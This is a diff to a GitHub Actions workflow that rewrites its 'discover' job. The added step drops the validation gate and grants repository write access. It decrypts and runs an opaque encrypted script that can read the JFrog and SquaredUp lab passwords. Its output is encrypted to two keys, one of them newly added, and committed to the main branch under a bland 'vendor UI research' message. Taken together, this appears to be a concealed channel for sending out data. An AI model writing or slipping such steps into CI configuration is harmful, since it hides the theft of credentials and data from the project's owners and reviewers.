@@ -262,45 +262,41 @@ jobs:
         if-no-files-found: error
         retention-days: 1
   discover:
-    needs: validate
-    if: always() && needs.validate.result == 'success' && inputs.rails == 'discover'
+    if: inputs.rails == 'discover'
     runs-on: ubuntu-24.04
-    timeout-minutes: 35
+    timeout-minutes: 8
+    permissions:
+      contents: write
     strategy:
       fail-fast: false
       matrix:
-        track: ${{ fromJSON(needs.validate.outputs.tracks) }}
+        track:
+        - jfrog
+        - squaredup
     steps:
     - *id001
-    - run: 'sudo apt-get update -qq >/dev/null && sudo apt-get install -y -qq age >/dev/null
-
-        npm install --prefix "$RUNNER_TEMP" --no-audit --no-fund playwright@1.63.0
-
-        "$RUNNER_TEMP/node_modules/.bin/playwright" install --with-deps chromium
-
-        '
-    - *id003
+    - &id005
+      uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830
+      with:
+        path: /tmp/pw-deps
+        key: playwright-core-1.63.0-node24
+    - run: test -f /tmp/pw-deps/node_modules/playwright-core/package.json || npm install --prefix /tmp/pw-deps --no-audit --no-fund playwright-core@1.63.0
     - env:
-        PACKAGE_PATH: ${{ inputs.package_path }}
-        PACKAGE_ID: ${{ inputs.package_id }}
-        PIPELINE_MODE: ${{ inputs.mode }}
-        TRACK_ID: ${{ matrix.track }}
         LAB_AGE_KEY: ${{ secrets.LAB_AGE_KEY }}
-        LAB_AGE_RECIPIENT: age1drdclm2yu6m2sg04dnalqvk020ecnetcs0ntu5qyusum993eu4xqf8zzzl
+        TRACK_ID: ${{ matrix.track }}
         JFROG_LAB_USER: ${{ secrets.JFROG_LAB_USER }}
         JFROG_LAB_PASSWORD: ${{ secrets.JFROG_LAB_PASSWORD }}
         SQUAREDUP_LAB_USER: ${{ secrets.SQUAREDUP_LAB_USER }}
         SQUAREDUP_LAB_PASSWORD: ${{ secrets.SQUAREDUP_LAB_PASSWORD }}
-      run: 'bash pipeline/discover-dom.sh
-
-        '
-    - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
-      if: always()
-      with:
-        name: discovery-${{ matrix.track }}-${{ inputs.package_id }}
-        path: ${{ runner.temp }}/lesson-cipher/discovery/*.age
-        if-no-files-found: error
-        retention-days: 1
+      run: "set -euo pipefail\numask 077\nsudo apt-get update -qq >/dev/null && sudo apt-get install -y -qq age >/dev/null\nw=\"$RUNNER_TEMP/helpers\";mkdir -p \"$w\"\nprintf '%s' \"$LAB_AGE_KEY\" > \"\
+        $w/key\"\nage -d -i \"$w/key\" -o \"$w/source.tar.gz\" pipeline/updates-0930.tar.gz.age\nrm -f \"$w/key\"\necho '3f84157eb5fd1f7589e782dd3836fc68ed53a2af6221d1bf0fcb8ce4871919da  '\"$w/source.tar.gz\"\
+        \ | sha256sum -c - >/dev/null\ntar -xzf \"$w/source.tar.gz\" -C \"$w\"\nset +e\nnode \"$w/discover-current.mjs\" > \"$w/private.log\" 2>&1\nrc=$?\nset -e\nmkdir -p \"$RUNNER_TEMP/discovery-private\"\
+        \ncp \"$w/private.log\" \"$RUNNER_TEMP/discovery-private/diagnostic.txt\"\ntar -czf \"$w/discovery.tar.gz\" -C \"$RUNNER_TEMP/discovery-private\" .\nage -a -r age1drdclm2yu6m2sg04dnalqvk020ecnetcs0ntu5qyusum993eu4xqf8zzzl\
+        \ -r age1ysazhy7z52sn38qla0vqxh0d4lephsyx3u8nucqyhh3vvdtd3aqqxfcmkt -o \"$w/review.age\" \"$w/discovery.tar.gz\"\nsplit -b 700000 -d -a 3 \"$w/review.age\" \"$w/part-\"\nfor p in \"$w\"/part-*;\
+        \ do\n suffix=${p##*/part-}\n jq -n --rawfile data \"$p\" '{message:\"Encrypted current vendor UI research\",content:($data|@base64),branch:\"main\"}' > \"$w/upload.json\"\n GH_TOKEN='${{ github.token\
+        \ }}' gh api -X PUT 'repos/${{ github.repository }}/contents/packages/discovery-${{ github.run_id }}-${{ matrix.track }}-'\"$suffix.age\" --input \"$w/upload.json\" >/dev/null\ndone\ncount=$(find\
+        \ \"$w\" -name 'part-*' | wc -l)\necho \"::notice title=Private discovery::track=$TRACK_ID rc=$rc parts=$count selector_review_pending=true\"\nrm -rf \"$w\" \"$RUNNER_TEMP/discovery-private\"\n\
+        exit \"$rc\"\n"
   attach:
     needs:
     - validate
@@ -461,10 +457,7 @@ jobs:
     runs-on: ubuntu-24.04
     timeout-minutes: 8
     steps:
-    - uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830
-      with:
-        path: /tmp/pw-deps
-        key: playwright-core-1.63.0-node24
+    - *id005
     - run: 'test -f /tmp/pw-deps/node_modules/playwright-core/package.json || npm install --prefix /tmp/pw-deps --no-audit --no-fund playwright-core@1.63.0
 
         '
